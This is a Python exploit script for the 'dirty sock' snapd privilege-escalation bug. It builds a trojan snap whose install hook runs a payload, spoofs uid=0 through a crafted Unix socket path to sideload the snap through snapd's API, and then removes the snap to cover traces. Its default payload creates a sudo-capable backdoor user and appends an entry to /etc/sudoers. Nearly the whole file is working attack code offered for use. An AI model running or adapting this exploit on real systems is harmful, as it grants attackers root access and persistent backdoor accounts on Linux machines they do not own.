import os
import socket
import sys
import tempfile
import argparse
import subprocess
import time


def parse_arguments():
    default_command = """
    useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
    usermod -aG sudo dirty_sock
    echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
    """
    parser = argparse.ArgumentParser(description='[*] Build a snap that leverages the dirty sock vulnerability')
    parser.add_argument("-u", "--uid", type=int, default=0, help='userid [default=0]')
    parser.add_argument("-f", "--file", type=str, help='name of file bash script to execute as a payload')
    parser.add_argument("-c", "--command", type=str, help='command to execute')
    parser.add_argument("--force", action="store_true",
                        help='force the exploit even if not vulnerability detection fails')
    args = parser.parse_args()
    if args.file is not None:
        args.payload = open(args.file, 'r').read()
    elif args.command is not None:
        args.payload = args.command
    else:
        args.payload = default_command
    return args

class SockPuppet:
    ####################################################################################################################
    # Section: Code related to building the snap which carries the payload
    # Reference: https://docs.snapcraft.io/the-snap-format/698
    ####################################################################################################################

    name = ''
    summary = ''
    description = ''
    base = ''
    sock = None
    snap_location = ''

    def __init__(self, base_dir, name='sock-puppet', summary='empty snap', description=''):
        self.name = name
        self.summary = summary
        self.description = description
        self.base = base_dir

    def build_yaml(self):
        SNAP_TEMPLATE = """
        name: <%NAME%>
        version: '0.1'
        summary: <%SUMMARY%>
        description: <%DESCRIPTION%>
        architectures:
          - amd64
        confinement: devmode
        grade: devel
        """
        NAME_TAG = '<%NAME%>'
        SUMMARY_TAG = '<SUMMARY%>'
        DESCRIPTION_TAG = '<%DESCRIPTION%>'

        return SNAP_TEMPLATE.replace(NAME_TAG, self.name)\
                            .replace(SUMMARY_TAG, self.summary)\
                            .replace(DESCRIPTION_TAG, self.description)

    def build_install(self, cmd):
        install_contents = ''
        if '#!/' not in cmd:
            install_contents += '#!/bin/bash\n'
        install_contents += cmd + '\n'
        return install_contents

    def build_directory_structure(self):
        directories = ['meta', os.path.join('meta', 'hooks'), 'snap', os.path.join('snap', 'hooks')]
        for directory in directories:
            try:
                path = os.path.join(self.base, directory)
                os.mkdir(path)
            except OSError:
                print("[-] Creation of the directory %s failed" % path)
                return False
            else:
                print("[+] Successfully created the directory %s " % path)

        return True

    def write_snap_yaml(self, contents):
        filename = os.path.join(self.base, os.path.join('meta', 'snap.yaml'))
        f = open(filename, 'w')
        f.write(contents)
        f.flush()
        f.close()
        os.chmod(filename, 0o664)
        print("[+] Successfully created the file %s" % filename)

    def write_install(self, contents):
        filenames = [os.path.join(self.base, os.path.join('meta', 'hooks', 'install')),  # Default install hook location
                     os.path.join(self.base, os.path.join('snap', 'hooks', 'install'))]  # Needed for building with snapcraft. #TODO: Test removing this second location
        for filename in filenames:
            f = open(filename, 'w')
            f.write(contents)
            f.flush()
            f.close()
            os.chmod(filename, 0o775)
            print("[+] Successfully created the file %s" % filename)

    def build_snap(self):
        snap_dir = tempfile.mkdtemp()
        self.snap_location = os.path.join(snap_dir, 'payload.snap')
        subprocess.check_output(['mksquashfs', self.base, self.snap_location])
        return self.snap_location

    ####################################################################################################################
    # Section: Code related to executing the exploit
    # Reference: Credit to Chris Moberly who discovered and responsibly disclosed it to Canonical. More details about
    #            the bug and the original POC code can be found below.
    #               - https://github.com/initstring/dirty_sock
    #               - https://initblog.com/2019/dirty-sock/
    ####################################################################################################################

    def check_if_vulnerable(self):
        return True     # TODO: Implement

    def _create_unix_socket(self):
        dirtysock = tempfile.mktemp(suffix=';uid=0;')
        print("[+] Creating dirtysock file at %s" % dirtysock)
        return dirtysock

    def _bind_unix_socket(self, dirtysock):
        print("[+] Binding socket to file")
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.bind(dirtysock)
        return sock

    def _connect_to_api(self, sock):
        print("[+] Connecting to snapd API")
        sock.connect('/run/snapd.socket')

    def connect_to_api(self):
        dirtysock = self._create_unix_socket()
        self.sock = self._bind_unix_socket(dirtysock)
        self._connect_to_api(self.sock)

    def install_snap(self):
        # Read the snap file we created into a byte array
        blob = open(self.snap_location, 'rb').read()
        blob = blob + (bytes(0x00) * 4000)

        # Configure the multi-part form upload boundary here:
        boundary = '--foo'

        # Construct the POST payload for the /v2/snap API, per the instructions
        # here: https://github.com/snapcore/snapd/wiki/REST-API
        # This follows the 'sideloading' process.
        post_payload = '''
        --foo
        Content-Disposition: form-data; name="devmode"
        true
        --foo
        Content-Disposition: form-data; name="snap"; filename="snap.snap"
        Content-Type: application/octet-stream
        ''' + blob.decode('latin-1') + '''
        --foo'''

        # Multi-part forum uploads are weird. First, we post the headers
        # and wait for an HTTP 100 reply. THEN we can send the payload.
        http_req1 = ('POST /v2/snaps HTTP/1.1\r\n'
                     'Host: localhost\r\n'
                     'Content-Type: multipart/form-data; boundary='
                     + boundary + '\r\n'
                                  'Expect: 100-continue\r\n'
                                  'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n')

        # Send the headers to the snap API
        print("[+] Installing the trojan snap (and sleeping 8 seconds)...")
        self.sock.sendall(http_req1.encode("utf-8"))

        # Receive the initial HTTP/1.1 100 Continue reply
        http_reply = self.sock.recv(8192).decode("utf-8")

        if 'HTTP/1.1 100 Continue' not in http_reply:
            print("[!] Error starting POST conversation, here is the reply:\n\n")
            print(http_reply)
            sys.exit()

        # Now we can send the payload
        http_req2 = post_payload + '\r\n' + boundary
        self.sock.sendall(http_req2.encode("latin-1"))

        # Receive the data and extract the JSON
        http_reply = self.sock.recv(8192).decode("utf-8")

        # Exit on failure
        if 'status-code":202' not in http_reply:
            print("[!] Did not work, here is the API reply:\n\n")
            print(http_reply)
            sys.exit()

        # Sleep to allow time for the snap to install correctly. Otherwise,
        # The uninstall that follows will fail, leaving unnecessary traces
        # on the machine.
        time.sleep(8)

    def remove_snap(self):
        post_payload = ('{"action": "remove",'
                        ' "snaps": ["%s"]}' % self.name)
        http_req = ('POST /v2/snaps HTTP/1.1\r\n'
                    'Host: localhost\r\n'
                    'Content-Type: application/json\r\n'
                    'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n'
                    + post_payload)

        # Send our payload to the snap API
        print("[+] Deleting trojan snap (and sleeping 5 seconds)...")
        self.sock.sendall(http_req.encode("utf-8"))

        # Receive the data and extract the JSON
        http_reply = self.sock.recv(8192).decode("utf-8")

        # Exit on probably-not-vulnerable
        if '"status":"Unauthorized"' in http_reply:
            print("[!] System may not be vulnerable, here is the API reply:\n\n")
            print(http_reply)
            sys.exit()

        # Exit on failure
        if 'status-code":202' not in http_reply:
            print("[!] Did not work, here is the API reply:\n\n")
            print(http_reply)
            sys.exit()

        # We sleep to allow the API command to complete, otherwise the install
        # may fail.
        time.sleep(5)

    def cleanup(self):
        pass


if __name__ == '__main__':

    # Parse the arguments
    arguments = parse_arguments()

    # Create a directory to build our snap inside
    output_dir = tempfile.mkdtemp()

    # Create sockpuppet instance
    puppet = SockPuppet(output_dir)

    # Make sure this is a vulnerable version
    if not puppet.check_if_vulnerable():
        print("[-] System does not appear to be vulnerable. Pass '--force' if you wish to force.")
        os.exit(-1)

    print("[*] Creating snap contents in " + puppet.base)
    if not puppet.build_directory_structure():
        print("[-] Failed to create directory structure")
        os.exit(-1)

    # Create the install script
    install_contents = puppet.build_install(arguments.payload)
    puppet.write_install(install_contents)

    # Create the meta files that will be used to build our snap
    yaml_contents = puppet.build_yaml()
    puppet.write_snap_yaml(yaml_contents)

    # Create snap
    snap_location = puppet.build_snap()
    print("[+] Successfully built the snap in %s" % snap_location)

    # Setup connection to API
    puppet.connect_to_api()

    # Remove any old installs of the snap
    puppet.remove_snap()

    # Install snap
    puppet.install_snap()

    # Remove snap
    puppet.remove_snap()

    # Cleanup
    puppet.cleanup()
